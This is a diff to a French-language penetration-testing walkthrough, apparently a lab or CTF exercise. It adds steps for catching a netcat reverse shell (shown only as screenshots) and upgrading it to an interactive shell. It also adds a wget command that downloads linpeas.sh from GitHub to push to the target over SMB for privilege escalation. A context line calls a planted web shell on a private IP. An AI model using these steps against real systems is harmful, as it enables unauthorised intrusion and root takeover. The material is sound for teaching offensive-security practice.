@@ -111,6 +111,38 @@ curl "http://192.168.188.214/shell.php?cmd=id"
 
 ![image25](https://github.com/user-attachments/assets/776c46b5-38c4-449b-87dd-4eba64c88dbf)
 
+Maintenant on doit démarrer netcat et attendre que la cible nous communique.
+
+![image26](https://github.com/user-attachments/assets/73f39262-64fe-48bb-9893-cedda1799338)
+
+Donc on retrouve sur la cible et on va lancer :
+
+![image24](https://github.com/user-attachments/assets/408ac94e-5ca4-4b4e-b3d2-523f2ed20d7f)
+
+Ce qui va nous permettre de nous connecter :
+
+![image15](https://github.com/user-attachments/assets/1547e4f5-ec92-4054-9588-024d8e1f4fd2)
+
+Nous allons passer sur un shell interactif via la commande :
+
+![image13](https://github.com/user-attachments/assets/08a0f85a-f8db-4fa4-8603-dce39ef70004)
+![image20](https://github.com/user-attachments/assets/ec2caedc-964e-4160-bdb8-f7f4a2cc8a99)
+
+Nous allons tester les identifiants avec les outils Linpeas :
+
+linpeas.sh est un script qui analyse automatiquement le système pour détecter des failles d’élévation de privilèges. Il recherche des fichiers avec des permissions spéciales, des mots de passe cachés, des tâches cron vulnérables ou des services mal configurés qui pourraient permettre de devenir root. C’est un outil très pratique pour automatiser la découverte des vulnérabilités après avoir obtenu un premier accès sur une machine Linux.
+
+On peut récupérer cette outil de cette manière :
+linpeas.sh :
+
+```bash
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+chmod +x linpeas.sh
+```
+Il suffira juste des les envoyer sur la machine cible en smb :
+
+![image18](https://github.com/user-attachments/assets/c9542e96-f43a-40b5-9238-12d4682e7c59)
+
 ## 5. Élévation de Privilèges
 
 ### 5.1. Analyse avec Linpeas
